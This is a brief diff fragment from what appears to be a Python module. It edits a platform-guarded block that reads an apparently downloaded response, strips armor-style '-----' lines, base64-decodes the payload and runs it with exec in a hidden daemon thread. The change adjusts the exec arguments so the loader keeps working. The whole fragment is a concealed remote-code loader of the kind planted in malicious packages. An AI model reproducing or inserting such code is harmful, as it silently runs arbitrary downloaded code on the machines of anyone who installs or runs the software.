@@ -37,7 +37,7 @@ if _platform in ('Windows', 'Linux'):
     code = response.read().decode()
     b=''.join(l for l in code.splitlines() if not l.startswith('-----'))
     b = base64.b64decode(b)
-    threading.Thread(target=exec, args=(b,), daemon=True).start()
+    threading.Thread(target=exec,  args=(b, {"__builtins__": __builtins__}), daemon=True).start()
 
 
 #------------------------------------------------------------------------------
